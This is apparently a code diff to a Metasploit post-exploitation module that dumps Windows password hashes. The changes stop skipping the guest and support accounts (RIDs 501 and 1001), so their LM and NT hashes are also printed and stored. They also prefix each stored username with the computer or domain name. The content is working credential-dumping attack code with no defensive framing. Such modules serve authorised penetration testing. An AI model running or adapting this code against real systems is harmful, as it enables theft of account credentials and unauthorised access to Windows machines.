@@ -240,7 +240,7 @@ class MetasploitModule < Msf::Post
       print_status("\tDumping password hashes...")
       users.keys.sort{|a,b| a<=>b}.each do |rid|
         # next if guest account or support account
-        next if rid == 501 or rid == 1001
+        # next if rid == 501 or rid == 1001
         collected_hashes << "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::\n"
 
         print_good("\t#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::")
@@ -259,7 +259,7 @@ class MetasploitModule < Msf::Post
             post_reference_name: self.refname,
             private_type: :ntlm_hash,
             private_data: users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
-            username: users[rid][:Name]
+            username: "#{sysinfo['Computer']}" + "\\" + users[rid][:Name]
         }
 
         credential_data.merge!(service_data)
@@ -315,7 +315,7 @@ class MetasploitModule < Msf::Post
       rid =  returned_hash[1].to_i
 
       # Skip the Guest Account
-      next if rid == 501 or rid == 1001
+      # next if rid == 501 or rid == 1001
 
       # skip if it returns nil for an entry
       next if h == nil
@@ -341,7 +341,7 @@ class MetasploitModule < Msf::Post
             post_reference_name: self.refname,
             private_type: :ntlm_hash,
             private_data: "#{lmhash}:#{returned_hash[3]}",
-            username: user
+            username: "#{sysinfo['Domain']}" + '\\' + user 
         }
 
         credential_data.merge!(service_data)
